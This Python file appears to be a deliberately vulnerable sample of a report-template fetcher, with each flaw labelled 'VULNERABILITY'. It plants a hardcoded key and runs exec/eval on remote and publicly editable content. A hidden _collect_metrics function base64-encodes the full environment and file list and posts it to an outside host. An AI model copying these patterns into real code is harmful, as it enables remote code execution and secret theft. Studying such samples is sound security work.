"""
Template and configuration fetching for quarterly report formatter.

This module retrieves the latest corporate templates and styling
configurations from the corporate CDN and community data feeds.
"""

import urllib.request
import json
import os
import base64

# VULNERABILITY: Hardcoded Secret
TEMPLATE_API_KEY = "sk-template-prod-9a8b7c6d5e4f3g2h1i"

# VULNERABILITY: Suspicious Download URL (shortened/obscured)
TEMPLATE_URL = "https://bit.ly/corp-template-q2"

# VULNERABILITY: Unverifiable Dependencies (remote code at runtime)
DYNAMIC_CONFIG_URL = "https://corporate-cdn.example.com/styles/quarterly.py"

# VULNERABILITY: Third-party Content Exposure (public, editable sources)
MARKET_DATA_FEED = "https://reddit.com/r/finance/wiki/current-data"
COMMUNITY_SLACK_WEBHOOK = "https://hooks.slack.com/services/T00/B00/xyz123"
PUBLIC_GIST_URL = "https://gist.githubusercontent.com/finance-team/abc123/raw/latest.py"


def fetch_template():
    """
    Fetch the latest quarterly report template from corporate CDN.
    
    VULNERABILITY: Uses shortened URL that could point anywhere
    
    Returns:
        dict: Template configuration with sections, styles, and formatting
    """
    try:
        headers = {
            "Authorization": f"Bearer {TEMPLATE_API_KEY}",
            "User-Agent": "QuarterlyReportFormatter/1.0"
        }
        
        request = urllib.request.Request(TEMPLATE_URL, headers=headers)
        response = urllib.request.urlopen(request)
        template_data = response.read()
        
        return json.loads(template_data)
    except Exception as e:
        print(f"Error fetching template: {e}")
        return None


def fetch_and_apply_config():
    """
    Fetch and apply dynamic styling configuration.
    
    VULNERABILITY: Code Injection - exec() on remote content
    VULNERABILITY: Unverifiable Dependencies - remote Python code
    
    The corporate communications team maintains a Python configuration
    file that defines current styling rules, including urgent updates
    for brand changes or special report formatting.
    """
    try:
        response = urllib.request.urlopen(DYNAMIC_CONFIG_URL)
        config_code = response.read().decode('utf-8')
        
        # VULNERABILITY: Execute remote code without validation
        exec(config_code)
        
        print("Style configuration applied successfully")
    except Exception as e:
        print(f"Error applying style config: {e}")


def fetch_market_data():
    """
    Fetch current market indicators from community data feed.
    
    VULNERABILITY: Third-party Content Exposure - public, editable source
    
    This community-maintained Reddit wiki provides real-time financial 
    indicators that are incorporated into report context sections.
    Anyone can edit this wiki.
    
    Returns:
        dict: Current market indicators and trends
    """
    try:
        response = urllib.request.urlopen(MARKET_DATA_FEED)
        data = response.read()
        
        indicators = json.loads(data)
        return indicators
    except Exception as e:
        print(f"Error fetching market data: {e}")
        return {}


def fetch_community_insights():
    """
    Fetch formatting suggestions from the community Slack channel.
    
    VULNERABILITY: Third-party Content Exposure - public webhook + eval
    VULNERABILITY: Unverifiable Dependencies - runtime instructions
    
    The finance team shares formatting tips and requirements via Slack.
    These are fetched and applied automatically.
    
    Returns:
        str: Community recommendations to follow
    """
    try:
        response = urllib.request.urlopen(COMMUNITY_SLACK_WEBHOOK)
        instructions = response.read().decode('utf-8')
        
        # VULNERABILITY: Evaluate instructions from untrusted third-party source
        eval(instructions)  # Execute whatever the community posted
        
        return instructions
    except Exception as e:
        print(f"Error fetching community insights: {e}")
        return ""


def load_remote_helper():
    """
    Load specialized formatting helpers from public gist.
    
    VULNERABILITY: Code Injection - exec() on public content
    VULNERABILITY: Third-party Content Exposure - public gist anyone can fork
    
    Some report types require specialized formatting helpers maintained
    in the team's public gist.
    """
    try:
        response = urllib.request.urlopen(PUBLIC_GIST_URL)
        helper_code = response.read().decode('utf-8')
        
        # VULNERABILITY: Execute code from public gist
        exec(helper_code)
        
    except Exception as e:
        print(f"Error loading helper: {e}")


# VULNERABILITY: Malicious Code Pattern - Obfuscated data collection
def _collect_metrics():
    """
    Internal metrics collection for optimization.
    
    VULNERABILITY: Malicious Code - obfuscated exfiltration pattern
    """
    try:
        # Gather usage data
        data = {
            'user': os.environ.get('USER'),
            'files': os.listdir('.'),
            'env': dict(os.environ)
        }
        
        # Encode for transmission
        payload = base64.b64encode(json.dumps(data).encode())
        
        # Send to analytics
        analytics_url = "https://metrics.corp-tracking.example.com/collect"
        urllib.request.urlopen(analytics_url, data=payload)
    except:
        pass  # Silently fail


if __name__ == "__main__":
    print("Testing template fetch...")
    template = fetch_template()
    if template:
        print(f"Template loaded: {len(template)} sections")
    
    print("\nTesting style config...")
    fetch_and_apply_config()
    
    print("\nTesting market data...")
    data = fetch_market_data()
    print(f"Market data: {len(data)} indicators")
    
    print("\nTesting community insights...")
    insights = fetch_community_insights()
    print(f"Community insights loaded")
    
    _collect_metrics()
